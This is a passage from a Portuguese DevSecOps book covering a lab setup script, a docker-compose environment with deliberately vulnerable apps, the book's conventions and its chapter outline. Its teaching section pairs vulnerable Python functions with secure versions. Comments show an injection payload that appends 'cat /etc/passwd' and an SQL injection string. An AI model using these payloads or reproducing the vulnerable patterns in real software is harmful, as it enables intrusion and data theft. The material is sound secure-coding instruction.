    install kubectl /usr/local/bin/kubectl
    rm -f kubectl

    log_success "minikube e kubectl instalados."
}

# Instalar Python e ferramentas
install_python() {
    log_info "Instalando Python 3.10+ e ferramentas..."

    apt-get install -y -qq python3 python3-pip python3-venv

    # Criar ambiente virtual para o livro
    LAB_DIR="/opt/devsecops-lab"
    mkdir -p "$LAB_DIR"
    python3 -m venv "$LAB_DIR/venv"
    source "$LAB_DIR/venv/bin/activate"

    # Instalar ferramentas Python de segurança
    pip install --upgrade pip
    pip install \
        bandit \
        safety \
        semgrep \
        detect-secrets \
        pip-audit \
        cryptography

    log_success "Python e ferramentas de segurança instaladas."
}

# Instalar ferramentas de segurança CLI
install_security_tools() {
    log_info "Instalando ferramentas de segurança..."

    # Trivy (scanner de vulnerabilidades para containers e IaC)
    log_info "Instalando Trivy..."
    curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | \
        sh -s -- -b /usr/local/bin

    # Semgrep (SAST)
    log_info "Instalando Semgrep..."
    pip3 install semgrep

    # Gitleaks (detecção de secrets)
    log_info "Instalando Gitleaks..."
    GITLEAKS_VERSION="8.18.1"
    curl -sSL "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" | \
        tar xz -C /usr/local/bin gitleaks

    # Syft (geração de SBOM)
    log_info "Instalando Syft..."
    curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | \
        sh -s -- -b /usr/local/bin

    # Grype (análise de SBOM)
    log_info "Instalando Grype..."
    curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | \
        sh -s -- -b /usr/local/bin

    # OWASP ZAP CLI
    log_info "Instalando OWASP ZAP..."
    ZAP_VERSION="2.14.0"
    wget -q "https://github.com/zaproxy/zaproxy/releases/download/v${ZAP_VERSION}/ZAP_${ZAP_VERSION}_Linux.tar.gz"
    tar xzf "ZAP_${ZAP_VERSION}_Linux.tar.gz" -C /opt/
    ln -sf "/opt/ZAP_${ZAP_VERSION}/zap.sh" /usr/local/bin/zap-cli
    rm -f "ZAP_${ZAP_VERSION}_Linux.tar.gz"

    # Checkov (análise de IaC)
    log_info "Instalando Checkov..."
    pip3 install checkov

    # tfsec (análise de Terraform)
    log_info "Instalando tfsec..."
    curl -sfL https://raw.githubusercontent.com/aquasecurity/tfsec/master/scripts/install_linux.sh | \
        sh -s -- -b /usr/local/bin

    # Nmap (análise de rede)
    log_info "Instalando Nmap..."
    apt-get install -y -qq nmap

    log_success "Ferramentas de segurança instaladas."
}

# Instalar Terraform
install_terraform() {
    log_info "Instalando Terraform..."

    wget -q -O- https://apt.releases.hashicorp.com/gpg | \
        gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg

    echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \
        https://apt.releases.hashicorp.com $(lsb_release -cs) main" | \
        tee /etc/apt/sources.list.d/hashicorp.list

    apt-get update -qq
    apt-get install -y -qq terraform

    terraform --version
    log_success "Terraform instalado."
}

# Criar estrutura de diretórios do laboratório
create_lab_structure() {
    log_info "Criando estrutura de diretórios do laboratório..."

    LAB_DIR="/opt/devsecops-lab"
    mkdir -p "$LAB_DIR"/{chapters,projects,vulnerable-apps,secure-apps,configs}

    for i in $(seq -w 1 17); do
        mkdir -p "$LAB_DIR/chapters/ch${i}"
    done

    # Criar .gitignore global para o laboratório
    cat > "$LAB_DIR/.gitignore" << 'GITIGNORE'
# Secrets e credenciais
.env
.env.*
*.pem
*.key
*.crt
*.p12
credentials.json
service-account.json
*.tfstate
*.tfstate.backup
.terraform/
terraform.tfvars

# Dependências
node_modules/
vendor/
__pycache__/
*.pyc
*.pyo
.venv/
venv/

# Build artifacts
dist/
build/
*.egg-info/
target/

# IDE
.vscode/
.idea/
*.swp
*.swo
*~

# OS
.DS_Store
Thumbs.db

# Security scan outputs (pode conter dados sensíveis)
.sast-results/
.sca-results/
.trivy-results/
GITIGNORE

    # Criar Makefile para o laboratório
    cat > "$LAB_DIR/Makefile" << 'MAKEFILE'
.PHONY: help setup scan-sast scan-sca scan-container scan-secrets scan-all clean

LAB_DIR := /opt/devsecops-lab

help: ## Mostra esta ajuda
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \
		awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $$1, $$2}'

setup: ## Configura o ambiente de laboratório
	@echo "Configurando ambiente..."
	@$(LAB_DIR)/venv/bin/pip install -r $(LAB_DIR)/requirements.txt

scan-sast: ## Executa análise estática de código (SAST)
	@echo "Executando SAST com Semgrep..."
	@semgrep --config=auto --sarif --output=.sast-results.sarif .

scan-sca: ## Executa análise de dependências (SCA)
	@echo "Executando SCA com pip-audit..."
	@$(LAB_DIR)/venv/bin/pip-audit --format=json --output=sca-results.json

scan-container: ## Escaneia container em busca de vulnerabilidades
	@echo "Executando scan com Trivy..."
	@trivy image --severity HIGH,CRITICAL --format json --output=trivy-results.json

scan-secrets: ## Detecta secrets no repositório
	@echo "Executando detecção de secrets com Gitleaks..."
	@gitleaks detect --source . --report-format json --report-path=secrets-results.json

scan-all: scan-sast scan-sca scan-container scan-secrets ## Executa todos os scans
	@echo "Todos os scans concluídos."

clean: ## Limpa resultados de scans
	@rm -f .sast-results.sarif sca-results.json trivy-results.json secrets-results.json
	@echo "Resultados limpos."
MAKEFILE

    log_success "Estrutura de laboratório criada em $LAB_DIR"
}

# Verificar instalações
verify_installations() {
    log_info "Verificando instalações..."

    echo "--- Docker ---"
    docker --version || log_error "Docker não instalado"
    docker compose version || log_error "Docker Compose não instalado"

    echo "--- Kubernetes ---"
    minikube version || log_error "minikube não instalado"
    kubectl version --client || log_error "kubectl não instalado"

    echo "--- Python ---"
    python3 --version || log_error "Python não instalado"
    pip3 --version || log_error "pip não instalado"

    echo "--- Segurança ---"
    trivy --version || log_error "Trivy não instalado"
    semgrep --version || log_error "Semgrep não instalado"
    gitleaks version || log_error "Gitleaks não instalado"
    syft --version || log_error "Syft não instalado"
    grype --version || log_error "Grype não instalado"

    echo "--- IaC ---"
    terraform --version || log_error "Terraform não instalado"
    checkov --version || log_error "Checkov não instalado"

    log_success "Verificação concluída."
}

# Função principal
main() {
    echo "============================================"
    echo "  DevSecOps na Prática — Setup do Laboratório"
    echo "============================================"
    echo ""

    check_root
    check_os
    update_system
    install_base_deps
    install_docker
    install_kubernetes
    install_python
    install_security_tools
    install_terraform
    create_lab_structure
    verify_installations

    echo ""
    echo "============================================"
    log_success "Setup concluído com sucesso!"
    echo "============================================"
    echo ""
    echo "Próximos passos:"
    echo "  1. Desconecte e reconecte para usar docker sem sudo"
    echo "  2. Execute: source /opt/devsecops-lab/venv/bin/activate"
    echo "  3. Inicie o minikube: minikube start"
    echo "  4. Explore a estrutura: tree /opt/devsecops-lab/"
    echo ""
}

main "$@"
```

### 4.3 Ambiente de Laboratório com Docker Compose

```yaml
# docker-compose.yml — Ambiente de laboratório do livro
#
# Este arquivo configura o ambiente completo de laboratório
# para acompanhar os exercícios práticos.
#
# Uso:
#   docker compose up -d
#   docker compose ps
#   docker compose logs -f
#   docker compose down

services:
  # ========================================
  # Registry Privado de Containers
  # ========================================
  registry:
    image: registry:2.8
    container_name: devsecops-registry
    ports:
      - "5000:5000"
    volumes:
      - registry-data:/var/lib/registry
    environment:
      REGISTRY_STORAGE_DELETE_ENABLED: "true"
      REGISTRY_HTTP_HEADERS_Access-Control-Allow-Origin: '["*"]'
      REGISTRY_HTTP_HEADERS_Access-Control-Allow-Methods: '["GET","PUT","POST","DELETE"]'
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:5000/v2/"]
      interval: 10s
      timeout: 5s
      retries: 3

  # ========================================
  # Nexus — Gerenciador de Artefatos
  # ========================================
  nexus:
    image: sonatype Nexus3:3.68.0
    container_name: devsecops-nexus
    ports:
      - "8081:8081"
    volumes:
      - nexus-data:/nexus-data
    environment:
      INSTALL4J_ADD_VM_PARAMS: "-Xms512m -Xmx1024m -Djava.util.prefs.userRoot=/nexus-data/javaprefs"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8081/service/rest/v1/status"]
      interval: 30s
      timeout: 10s
      retries: 5
      start_period: 120s

  # ========================================
  # GitLab — Repositório com CI/CD integrado
  # ========================================
  gitlab:
    image: gitlab/gitlab-ce:16.11-ce.0
    container_name: devsecops-gitlab
    ports:
      - "8082:80"
      - "2222:22"
    volumes:
      - gitlab-config:/etc/gitlab
      - gitlab-logs:/var/log/gitlab
      - gitlab-data:/var/opt/gitlab
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://localhost:8082'
        gitlab_rails['gitlab_shell_ssh_port'] = 2222
        prometheus_monitoring['enable'] = false
        grafana['enable'] = false
        puma['worker_processes'] = 2
        sidekiq['max_concurrency'] = 10
        nginx['worker_processes'] = 2
    shm_size: '256m'
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8082/-/health"]
      interval: 30s
      timeout: 10s
      retries: 10
      start_period: 180s

  # ========================================
  # Portainer — Interface de Gerenciamento Docker
  # ========================================
  portainer:
    image: portainer/portainer-ce:2.20.0
    container_name: devsecops-portainer
    ports:
      - "9443:9443"
      - "9000:9000"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - portainer-data:/data
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:9000"]
      interval: 10s
      timeout: 5s
      retries: 3

  # ========================================
  # Vault — Gerenciamento de Secrets
  # ========================================
  vault:
    image: hashicorp/vault:1.16
    container_name: devsecops-vault
    ports:
      - "8200:8200"
    volumes:
      - vault-data:/vault/file
      - ./configs/vault-config.hcl:/vault/config/config.hcl
    cap_add:
      - IPC_LOCK
    environment:
      VAULT_ADDR: "http://0.0.0.0:8200"
      VAULT_API_ADDR: "http://localhost:8200"
    command: server -config=/vault/config/config.hcl
    healthcheck:
      test: ["CMD", "vault", "status", "-address=http://localhost:8200"]
      interval: 10s
      timeout: 5s
      retries: 3

  # ========================================
  # PostgreSQL — Banco de dados para testes
  # ========================================
  postgres:
    image: postgres:16-alpine
    container_name: devsecops-postgres
    ports:
      - "5432:5432"
    volumes:
      - postgres-data:/var/lib/postgresql/data
      - ./configs/init.sql:/docker-entrypoint-initdb.d/init.sql
    environment:
      POSTGRES_DB: devsecops_lab
      POSTGRES_USER: lab_admin
      POSTGRES_PASSWORD: "${DB_PASSWORD:-change_me_in_production}"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U lab_admin -d devsecops_lab"]
      interval: 10s
      timeout: 5s
      retries: 5

  # ========================================
  # Redis — Cache e sessões
  # ========================================
  redis:
    image: redis:7-alpine
    container_name: devsecops-redis
    ports:
      - "6379:6379"
    command: redis-server --requirepass "${REDIS_PASSWORD:-change_me_in_production}"
    volumes:
      - redis-data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "-a", "${REDIS_PASSWORD:-change_me_in_production}", "ping"]
      interval: 10s
      timeout: 5s
      retries: 3

  # ========================================
  # Vulnerable App — Aplicação intencionalmente vulnerável para testes
  # ========================================
  vulnerable-app:
    build:
      context: ./vulnerable-apps
      dockerfile: Dockerfile
    container_name: devsecops-vulnerable-app
    ports:
      - "3000:3000"
    environment:
      NODE_ENV: development
      DATABASE_URL: "postgresql://lab_admin:${DB_PASSWORD:-change_me_in_production}@postgres:5432/devsecops_lab"
      REDIS_URL: "redis://:${REDIS_PASSWORD:-change_me_in_production}@redis:6379"
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy

  # ========================================
  # Vulnerable API — API intencionalmente vulnerável para testes
  # ========================================
  vulnerable-api:
    build:
      context: ./vulnerable-apps/api
      dockerfile: Dockerfile
    container_name: devsecops-vulnerable-api
    ports:
      - "8000:8000"
    environment:
      DATABASE_URL: "postgresql://lab_admin:${DB_PASSWORD:-change_me_in_production}@postgres:5432/devsecops_lab"
      SECRET_KEY: "${API_SECRET_KEY:-insecure-key-for-testing-only}"
    depends_on:
      postgres:
        condition: service_healthy

  # ========================================
  # DVWA — Damn Vulnerable Web Application
  # ========================================
  dvwa:
    image: vulnerables/web-dvwa:1.10
    container_name: devsecops-dvwa
    ports:
      - "4280:80"
    environment:
      MYSQL_PASS: "${DVWA_MYSQL_PASS:-p@ssw0rd}"
    depends_on:
      - postgres

  # ========================================
  # Security Dashboard — Grafana + Prometheus
  # ========================================
  prometheus:
    image: prom/prometheus:v2.51.0
    container_name: devsecops-prometheus
    ports:
      - "9090:9090"
    volumes:
      - ./configs/prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--web.console.libraries=/etc/prometheus/console_libraries'
      - '--web.console.templates=/etc/prometheus/consoles'
      - '--storage.tsdb.retention.time=200h'
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:9090"]
      interval: 15s
      timeout: 5s
      retries: 3

  grafana:
    image: grafana/grafana:10.4.0
    container_name: devsecops-grafana
    ports:
      - "3001:3000"
    volumes:
      - grafana-data:/var/lib/grafana
      - ./configs/grafana/provisioning:/etc/grafana/provisioning
    environment:
      GF_SECURITY_ADMIN_USER: admin
      GF_SECURITY_ADMIN_PASSWORD: "${GRAFANA_PASSWORD:-admin}"
      GF_INSTALL_PLUGINS: grafana-clock-panel
    depends_on:
      prometheus:
        condition: service_healthy

volumes:
  registry-data:
  nexus-data:
  gitlab-config:
  gitlab-logs:
  gitlab-data:
  portainer-data:
  vault-data:
  postgres-data:
  redis-data:
  prometheus-data:
  grafana-data:

networks:
  default:
    name: devsecops-network
    driver: bridge
```

---

## 5. Convenções do Livro

### 5.1 Convencões de Blocos de Código

Todos os blocos de código neste livro seguem convenções específicas para maximizar a clareza e a utilidade prática:

- **Primeira linha do bloco**: sempre indica a linguagem (```bash, ```python, ```yaml, etc.)
- **Comentários no código**: explicam o "por que", não o "o quê"
- **Caminhos relativos**: referenciam a estrutura de diretórios do laboratório
- **Variáveis de ambiente**: usam o padrão `${VAR_NAME:-default_value}` para documentar valores padrão
- **Versões fixadas**: todas as dependências e ferramentas têm versões explícitas, nunca "latest"

```
# Exemplo de como blocos de código são apresentados no livro:
#
# A primeira linha indica a linguagem
# Comentários explicam decisões de design
# O código é funcional e pode ser copiado diretamente

# Bloco Bash:
echo "Este é um exemplo funcional"

# Bloco Python:
# python3 example.py
# import os
# import sys

# Bloco YAML (CI/CD):
# name: Pipeline Example
# on: [push, pull_request]
# jobs:
#   build:
#     runs-on: ubuntu-latest

# Bloco Dockerfile:
# FROM python:3.12-slim
# WORKDIR /app
# COPY . .
# RUN pip install --no-cache-dir -r requirements.txt

# Bloco Go:
# package main
# import "crypto/sha256"
# // SHA-256 verification for artifact integrity
```

### 5.2 Fixação de Versões de Ferramentas

Todas as ferramentas usadas neste livro têm versões fixadas. Isso é uma prática essencial de DevSecOps: executar versões conhecidas e verificadas em vez de sempre buscar a versão mais recente.

```yaml
# Exemplo de fixação de versões em pipeline
# Cada ferramenta tem versão explícita — NUNCA use @latest em produção

steps:
  - name: Trivy scan (versão fixa)
    uses: aquasecurity/trivy-action@0.24.0  # NÃO: @master ou @latest
    with:
      image-ref: myapp:1.0.0

  - name: Semgrep (versão fixa)
    uses: semgrep/semgrep-action@v1.10.0  # NÃO: @v1 (pula versões)
    with:
      config: p/security-audit

  - name: Gitleaks (versão fixa)
    uses: gitleaks/gitleaks-action@v2.1.3  # NÃO: @v2 (pula versões)
```

### 5.3 Estrutura do Laboratório

```
/opt/devsecops-lab/
├── chapters/                  # Código organizado por capítulo
│   ├── ch01/
│   │   ├── examples/
│   │   ├── labs/
│   │   └── solutions/
│   ├── ch02/
│   │   ├── examples/
│   │   ├── labs/
│   │   └── solutions/
│   └── ... (até ch17)
├── projects/                  # Projetos de referência
│   ├── vulnerable-webapp/     # Aplicação web vulnerável
│   ├── vulnerable-api/        # API vulnerável
│   ├── secure-webapp/         # Versão segura da webapp
│   └── secure-api/            # Versão segura da API
├── vulnerable-apps/           # Aplicações intencionalmente vulneráveis
│   ├── sql-injection/
│   ├── xss/
│   ├── command-injection/
│   └── insecure-deserialization/
├── secure-apps/               # Versões corrigidas
├── configs/                   # Configurações de ferramentas
│   ├── vault-config.hcl
│   ├── prometheus.yml
│   ├── grafana/
│   └── semgrep/
├── docker-compose.yml
├── Makefile
├── .gitignore
└── README.md
```

### 5.4 Padrão Vulnerável vs. Seguro

Cada capítulo apresenta pelo menos um par de exemplos: um vulnerável e um seguro. O padrão é sempre o mesmo:

**Vulnerável**: O código ou configuração que demonstra a falha, com explicações de por que é problemático e como um atacante poderia explorar.

**Seguro**: A versão corrigida, com explicação de como a correção mitiga a vulnerabilidade.

```python
# ============================================
# PADRÃO VULNERÁVEL — NÃO USE EM PRODUÇÃO
# ============================================
# Este código demonstra vulnerabilidade de command injection

import subprocess
import os

def ping_host(hostname):
    """Vulnerável a command injection."""
    # VULNERABILIDADE: hostname vem de input do usuário
    # e é passado diretamente para o shell
    result = subprocess.run(
        f"ping -c 1 {hostname}",  # Injection aqui!
        shell=True,                # shell=True é perigoso
        capture_output=True,
        text=True
    )
    return result.stdout

# Um atacante poderia enviar:
# hostname = "127.0.0.1; cat /etc/passwd"
# e o comando resultante seria:
# "ping -c 1 127.0.0.1; cat /etc/passwd"


# ============================================
# PADRÃO SEGURO — ESTA É A ABORDAGEM CORRETA
# ============================================
# Esta versão previne command injection

import subprocess
import os
import re
import shlex

def ping_host_secure(hostname):
    """
    Versão segura: valida input e usa argumentos separados.

    Correções aplicadas:
    1. Validação rigorosa do hostname
    2. Não usa shell=True
    3. Passa argumentos como lista, não como string
    4. Escapa argumentos corretamente
    """
    # Validação de hostname (RFC 952 / RFC 1123)
    hostname_pattern = re.compile(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?'
        r'(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    )

    if not hostname_pattern.match(hostname):
        raise ValueError(f"Hostname inválido: {hostname}")

    # Validação adicional: comprimento máximo
    if len(hostname) > 253:
        raise ValueError("Hostname excede comprimento máximo (253 caracteres)")

    # Execução segura: shell=False + argumentos como lista
    result = subprocess.run(
        ["ping", "-c", "1", "-W", "5", hostname],
        capture_output=True,
        text=True,
        timeout=10  # Timeout para evitar DoS
    )

    return result.stdout


# ============================================
# PADRÃO VULNERÁVEL — SQL Injection
# ============================================
def get_user_vulnerable(username):
    """Vulnerável a SQL injection."""
    import sqlite3

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # VULNERABILIDADE: interpolação direta de input em query SQL
    query = f"SELECT * FROM users WHERE username = '{username}'"
    # Um atacante poderia enviar:
    # username = "admin' OR '1'='1"
    # Resultado: retorna TODOS os usuários

    cursor.execute(query)
    return cursor.fetchall()


# ============================================
# PADRÃO SEGURO — Parameterized Query
# ============================================
def get_user_secure(username):
    """
    Versão segura: usa queries parametrizadas.

    Correções aplicadas:
    1. Query parametrizada (placeholder ?)
    2. Validação de tipo
    3. Comprimento máximo
    4. Caracteres permitidos
    """
    import sqlite3
    import re

    # Validação de username
    if not isinstance(username, str):
        raise TypeError("Username deve ser string")

    if len(username) > 50:
        raise ValueError("Username excede comprimento máximo")

    if not re.match(r'^[a-zA-Z0-9_]{3,50}$', username):
        raise ValueError("Username contém caracteres inválidos")

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # Query parametrizada — o driver SQL escapa automaticamente
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchall()
```

### 5.5 Padrão de Documentação de Casos Públicos

Os casos públicos documentados neste livro seguem uma estrutura padronizada:

| Campo | Descrição |
|-------|-----------|
| **Nome do Caso** | Nome identificador do incidente |
| **Data** | Ano do incidente |
| **O que aconteceu** | Descrição objetiva do incidente |
| **Impacto** | Números, organizações afetadas, consequências |
| **Causa Raiz** | Análise técnica da falha subjacente |
| **Lição para DevSecOps** | Práticas que poderiam ter prevenido ou detectado |

---

## 6. Estrutura do Livro

### 6.1 Visão Geral dos 17 Capítulos

Este livro é organizado em 17 capítulos, agrupados em quatro partes temáticas.

#### Parte I: Fundamentos (Capítulos 1–4)

**Capítulo 1: Fundamentos de Segurança em Pipelines CI/CD**
Introduz os conceitos fundamentais de segurança aplicados a pipelines de integração e entrega contínua. Cobertura de SAST, DAST, SCA e detecção de secrets. Casos: Codecov, GitHub Actions.

**Capítulo 2: Análise Estática de Código (SAST)**
Configuração e uso de ferramentas SAST como Semgrep, Bandit e SonarQube. Escaneamento de código em múltiplas linguagens. Integração com pull requests. Casos: vulnerabilities em dependências.

**Capítulo 3: Análise de Dependências (SCA)**
Mapeamento e análise de dependências de software. Uso de Trivy, Snyk, OWASP Dependency-Check e pip-audit. SBOM generation. Casos: Log4Shell, xz-utils.

**Capítulo 4: Detecção e Gestão de Secrets**
Detecção automática de credenciais e segredos no código e nos pipelines. Uso de Gitleaks, TruffleHog e detect-secrets. Gestão de secrets com Vault e GitHub/GitLab Secrets. Casos: Travis CI, Capital One.

#### Parte II: Container Security (Capítulos 5–8)

**Capítulo 5: Segurança de Containers Docker**
Hardening de Dockerfiles, escaneamento de imagens, runtime security. Multi-stage builds, distroless images, user namespaces. Caso: Docker Hub malicious images.

**Capítulo 6: Kubernetes Security**
RBAC, Network Policies, Pod Security Standards, Secret Management. Uso de Kyverno e OPA/Gatekeeper para políticas de admission. Casos: ataques a clusters Kubernetes.

**Capítulo 7: Segurança em Orquestradores e Service Mesh**
Istio, Linkerd e service mesh security. mTLS, cert management, observabilidade de segurança. Casos: ataques laterais em ambientes de microservices.

**Capítulo 8: Runtime Security e Monitoramento**
Falco, osquery e auditd para detecção de comportamento anômalo em containers. Monitoramento de segurança em tempo real. Casos: detecção de cryptojacking em containers.

#### Parte III: Infrastructure as Code (Capítulos 9–12)

**Capítulo 9: Segurança em Terraform**
Análise estática de Terraform com tfsec, Checkov e Sentinel. Políticas como código. Caso: Capital One (configuração incorreta de IAM).

**Capítulo 10: Segurança em Ansible e Configuration Management**
Hardening de configuração, gestão de credenciais, compliance automation. Casos: configurações padrão inseguras.

**Capítulo 11: Segurança em Cloud (AWS, Azure, GCP)**
IAM, VPC, Security Groups, WAF, CloudTrail. Casos: Capital One, configuração incorreta de S3.

**Capítulo 12: Policy as Code e Compliance**
OPA/Rego, Kyverno, Sentinel. Compliance automation com Open Policy Agent. Casos: violações de compliance em organizações.

#### Parte IV: AppSec e Entrega Segura (Capítulos 13–17)

**Capítulo 13: OWASP Top 10 e Proteção de Aplicações Web**
Implementação prática de proteções contra as 10 vulnerabilidades mais comuns. Casos: Log4Shell, SQL injection em aplicações.

**Capítulo 14: DAST e Testes de Segurança Dinâmicos**
Configuração de OWASP ZAP, Nikto e Nuclei para testes de segurança em aplicações em execução.

**Capítulo 15: Segurança em Pipelines de Entrega Contínua**
Deploy strategies seguras, canary deployments, blue-green deployments com verificação de segurança. Casos: SolarWinds, 3CX.

**Capítulo 16: Incident Response e Forense Digital**
Detecção, contenção, erradicação e recuperação. Playbooks de incident response para DevSecOps. Casos: análise forense de incidentes documentados.

**Capítulo 17: Maturidade e Cultura DevSecOps**
Medição de maturidade, métricas de segurança, construção de cultura. Programas de bug bounty, security champions. Casos: organizações que implementaram DevSecOps com sucesso.

### 6.2 Caminhos de Leitura

Recomendamos diferentes caminhos dependendo do seu perfil:

#### Para Engenheiros DevOps (Recomendado: 6 semanas)

```
Semana 1: Capítulos 1-2 (Fundamentos e SAST)
Semana 2: Capítulos 3-4 (SCA e Secrets)
Semana 3: Capítulos 5-6 (Containers e Kubernetes)
Semana 4: Capítulos 9-10 (Terraform e Ansible)
Semana 5: Capítulos 13-14 (AppSec e DAST)
Semana 6: Capítulos 15-17 (Entrega, Incidentes e Maturidade)
```

#### Para Engenheiros de Segurança (Recomendado: 4 semanas)

```
Semana 1: Capítulos 1-4 (Fundamentos completos)
Semana 2: Capítulos 5-8 (Container Security completo)
Semana 3: Capítulos 9-12 (IaC Security)
Semana 4: Capítulos 13-17 (AppSec e maturidade)
```

#### Para Desenvolvedores (Recomendado: 8 semanas)

```
Semana 1-2: Capítulos 1-4 (Fundamentos — mais tempo para exercícios)
Semana 3-4: Capítulos 5-6 (Containers básicos)
Semana 5-6: Capítulos 13-14 (AppSec — mais tempo para laboratórios)
Semana 7-8: Capítulos 15-17 (Entrega e cultura)
```

### 6.3 Estrutura do Projeto de Laboratório

O projeto de laboratório acompanha o livro e permite executar todos os exercícios práticos localmente:

```bash
# Estrutura do projeto de laboratório
# Clone e configure com:
# git clone <repo-url> devsecops-lab
# cd devsecops-lab
# docker compose up -d

# Verificar status do ambiente
docker compose ps

# Resultado esperado (todas as colunas "Up"):
# NAME                     STATUS
# devsecops-registry       Up (healthy)
# devsecops-nexus          Up (healthy)
# devsecops-gitlab         Up (healthy)
# devsecops-portainer      Up
# devsecops-vault          Up
# devsecops-postgres       Up (healthy)
# devsecops-redis          Up (healthy)
# devsecops-prometheus     Up (healthy)
# devsecops-grafana        Up
```

---

## 7. Como Acompanhar Atualizações

### 7.1 Versão do Livro e Ferramentas

Este livro é um documento vivo. As ferramentas de segurança evoluem rapidamente, e as vulnerabilidades que documentamos são descobertas continuamente. Para manter o conteúdo relevante:

- **Versão do livro**: este documento é a versão 1.0
- **Versão das ferramentas**: todas as versões de ferramentas estão fixadas no momento da publicação. Verifique as notas de cada capítulo para atualizações
- **CVEs**: as vulnerabilidades documentadas são referências de data de publicação. CVEs novas podem surgir a qualquer momento

### 7.2 Atualização de Ferramentas

```bash
#!/bin/bash
# update-devsecops-tools.sh
# Script para atualizar ferramentas de segurança
#
# Execute periodicamente para manter as ferramentas atualizadas.
# As versões são verificadas contra o que está documentado no livro.

set -euo pipefail

echo "=========================================="
echo "  Atualização de Ferramentas DevSecOps"
echo "=========================================="

# Verificar versões atuais
echo ""
echo "--- Versões Atuais ---"
echo "Trivy:       $(trivy --version 2>/dev/null | head -1 || echo 'não instalado')"
echo "Semgrep:     $(semgrep --version 2>/dev/null || echo 'não instalado')"
echo "Gitleaks:    $(gitleaks version 2>/dev/null || echo 'não instalado')"
echo "Syft:        $(syft --version 2>/dev/null | head -1 || echo 'não instalado')"
echo "Grype:       $(grype version 2>/dev/null | head -1 || echo 'não instalado')"
echo "Checkov:     $(checkov --version 2>/dev/null || echo 'não instalado')"
echo "Terraform:   $(terraform --version 2>/dev/null | head -1 || echo 'não instalado')"

# Atualizar pip packages
echo ""
echo "--- Atualizando pip packages ---"
pip3 install --upgrade semgrep bandit safety detect-secrets pip-audit checkov

# Atualizar Trivy
echo ""
echo "--- Atualizando Trivy ---"
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | \
    sh -s -- -b /usr/local/bin

# Atualizar Gitleaks
echo ""
echo "--- Atualizando Gitleaks ---"
GITLEAKS_VERSION=$(curl -sSL https://api.github.com/repos/gitleaks/gitleaks/releases/latest | \
    jq -r '.tag_name' | sed 's/v//')
curl -sSL "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" | \
    tar xz -C /usr/local/bin gitleaks

# Atualizar Syft
echo ""
echo "--- Atualizando Syft ---"
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | \
    sh -s -- -b /usr/local/bin

# Atualizar Grype
echo ""
echo "--- Atualizando Grype ---"
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | \
    sh -s -- -b /usr/local/bin

# Verificar versões após atualização
echo ""
echo "--- Versões Atualizadas ---"
echo "Trivy:       $(trivy --version 2>/dev/null | head -1 || echo 'falha')"
echo "Semgrep:     $(semgrep --version 2>/dev/null || echo 'falha')"
echo "Gitleaks:    $(gitleaks version 2>/dev/null || echo 'falha')"
echo "Syft:        $(syft --version 2>/dev/null | head -1 || echo 'falha')"
echo "Grype:       $(grype version 2>/dev/null | head -1 || echo 'falha')"
echo "Checkov:     $(checkov --version 2>/dev/null || echo 'falha')"

echo ""
echo "Atualização concluída."
echo "Verifique as notas do capítulo correspondente para versões suportadas."
```

### 7.3 Rastreamento de CVEs

Recomendamos monitorar as seguintes fontes para manter-se atualizado:

- **NVD (National Vulnerability Database)**: https://nvd.nist.gov/
- **GitHub Advisory Database**: https://github.com/advisories
- **MITRE CVE**: https://cve.mitre.org/
- **OWASP**: https://owasp.org/
- **Trivy vulnerability database**: https://github.com/aquasecurity/vuln-trivy-db
- **OSV (Open Source Vulnerabilities)**: https://osv.dev/

```yaml
# Exemplo: Workflow de monitoramento de CVEs
# Execute semanalmente para detectar novas vulnerabilidades

name: CVE Monitor

on:
  schedule:
    - cron: '0 8 * * 1'  # Segunda-feira às 8h UTC
  workflow_dispatch:

jobs:
  check-cves:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verificar dependências com Dependabot
        uses: github/dependabot@v1

      - name: Scan com Trivy (todas as severidades)
        uses: aquasecurity/trivy-action@0.24.0
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'json'
          output: 'cve-report.json'
          severity: 'CRITICAL,HIGH,MEDIUM'

      - name: Gerar relatório
        run: |
          echo "## Relatório CVE - $(date -u +%Y-%m-%d)" > report.md
          echo "" >> report.md
          CRITICAL=$(jq '.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL") | .VulnerabilityID' cve-report.json 2>/dev/null | wc -l)
